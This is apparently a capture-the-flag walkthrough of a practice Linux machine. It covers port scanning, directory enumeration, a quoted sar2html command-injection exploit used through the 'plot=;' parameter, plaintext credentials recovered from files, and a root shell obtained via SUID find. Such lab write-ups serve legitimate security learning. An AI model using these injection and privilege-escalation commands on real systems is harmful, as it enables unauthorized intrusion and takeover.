1. At first run nmap:-
nmap -vv -Pn -sS -A -sC -p 0-65535 -T4 --osscan-guess --version-all --script-args=unsafe=1 -oA  TARGET_IP


PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.1.224
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 5322237298E5AF25F5BD0794F549A732
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
55007/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/2%OT=21%CT=1%CU=39148%PV=Y%DS=2%DC=T%G=Y%TM=6400A0EE
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11
OS:NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

2.  now test whether webmin is vulnerable or not.
link: https://www.exploit-db.com/exploits/47293

but it is not vulnerable

3. when use port 80 to access web page:
Its welcome screen apache ubutntu. Nothing there.

4. Now trying to access port 10000
ìt is webmin login page. Nothing reavels


5. gobuster dir -u http://10.10.8.197 -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,cgi,txt,js -t 64 -o gobuster_10_10_8_197_80.txt

/manual               (Status: 301) [Size: 311] [--> http://10.10.8.197/manual/]
/robots.txt           (Status: 200) [Size: 257]                                 
/joomla               (Status: 301) [Size: 311] [--> http://10.10.8.197/joomla/]


6. trying to access /manual
http://10.10.8.197/manual/en/index.html
got manual page of : # Apache HTTP Server Version 2.4 Documentation

7. now trying to access joomla cms
ref: https://hackertarget.com/attacking-enumerating-joomla/


8. using gobuser tried to enumerate ** joomla ** webdir
9. It contains:
/templates **           (Status: 301) [Size: 321] [--> http://10.10.14.19/joomla/templates/]
/media     **           (Status: 301) [Size: 317] [--> http://10.10.14.19/joomla/media/]    
/images   **            (Status: 301) [Size: 318] [--> http://10.10.14.19/joomla/images/]   
/index.php            (Status: 200) [Size: 12476]                                         
/modules  **            (Status: 301) [Size: 319] [--> http://10.10.14.19/joomla/modules/]  
/tests    **            (Status: 301) [Size: 317] [--> http://10.10.14.19/joomla/tests/]    
/plugins              (Status: 301) [Size: 319] [--> http://10.10.14.19/joomla/plugins/]  
/bin                  (Status: 301) [Size: 315] [--> http://10.10.14.19/joomla/bin/]      
/includes             (Status: 301) [Size: 320] [--> http://10.10.14.19/joomla/includes/] 
/language             (Status: 301) [Size: 320] [--> http://10.10.14.19/joomla/language/] 
/README.txt           (Status: 200) [Size: 4793]                                          
/components           (Status: 301) [Size: 322] [--> http://10.10.14.19/joomla/components/]
/cache                (Status: 301) [Size: 317] [--> http://10.10.14.19/joomla/cache/]     
/libraries            (Status: 301) [Size: 321] [--> http://10.10.14.19/joomla/libraries/] 
/installation         (Status: 301) [Size: 324] [--> http://10.10.14.19/joomla/installation/]
/build.xml            (Status: 200) [Size: 6441]                                             
/build                (Status: 301) [Size: 317] [--> http://10.10.14.19/joomla/build/]       
/LICENSE.txt          (Status: 200) [Size: 18092]                                            
/tmp                  (Status: 301) [Size: 315] [--> http://10.10.14.19/joomla/tmp/]         
/layouts              (Status: 301) [Size: 319] [--> http://10.10.14.19/joomla/layouts/]     
/administrator        (Status: 301) [Size: 325] [--> http://10.10.14.19/joomla/administrator/]
/configuration.php    (Status: 200) [Size: 0]                                                 
Progress: 53990 / 438325 (12.32%)                                                            [ERROR] 2023/03/02 20:28:58 [!] Get "http://10.10.14.19/joomla/Release.js": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/htaccess.txt         (Status: 200) [Size: 3159]                                              
/cli                  (Status: 301) [Size: 315] [--> http://10.10.14.19/joomla/cli/]          
/_files               (Status: 301) [Size: 318] [--> http://10.10.14.19/joomla/_files/]      

got stucked here! due to this enumeration. I should use enumerate using  directory-2.3-medium.txt or should use another tool.

It missed two directories:-
````
IP\joomla\_tests
IP\joomla\_files
````
8. now access build.xml
got version: 

Joomla! CMS 3.9 API


9. accessing TARGET_IP/robots.txt

```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```


after converting them in ASCII got:

OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK
It is a rabbit hole!!!!



10. after FTP login as anonymous got following file: 
`.info.txt`

it contains:

```
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!

```

after decoding it using: https://www.oocities.org/timessquare/realm/5247/topsecret.html got the decoded message.

```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

It is also a rabbit hole!!!!



when accessing:
```
TARGET_IP/joomla/_files

got:
 VjJodmNITnBaU0JrWVdsemVRbz0K
```

after decoding twice from base64:

Whopsie daisy

when accessing ````
````IP/joomla/_archive/

````


got: Mnope, nothin to see.


when accessing:

````
IP/joomla/_dabatabase
````

got following response:

Lwuv oguukpi ctqwpf.

## SUCCESS!!!

A. now trying to access the folder `/_test`
this folder contains sar2html

After googling found an exploit.

```
# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html 
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
```

B. Now tried to exploit with following request in browser:-

http://TARGET_IP/joomla/_test/index.php?plot=;ls -lha

got list of files in current directory:-

log.txt

C. now trying to list contents of it using same technique:

got credentials of one user:
```

basterd:superduperp@$$


````

D. now ssh as basterd with newly found credentials:

E. in the home directory following files are there.

```
drwxr-x--- 3 basterd basterd 4.0K Aug 22  2019 .
drwxr-xr-x 4 root    root    4.0K Aug 22  2019 ..
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
drwx------ 2 basterd basterd 4.0K Aug 22  2019 .cache

```

F. Now list contents of backup.sh
got password of another user: stoner

```
USER=stoner
#superduperp@$$no1knows

```

G. 
find / -perm -u=s -type f 2>/dev/null
````

/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/ping
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/apache2/suexec-custom
/usr/lib/apache2/suexec-pristine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/find
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap

````


H. using /usr/bin/find command elevate the privilege (cortsey:GTFOBINS)

```

/usr/bin/find . -exec /bin/sh -p \; -quit

```

got the root shell .


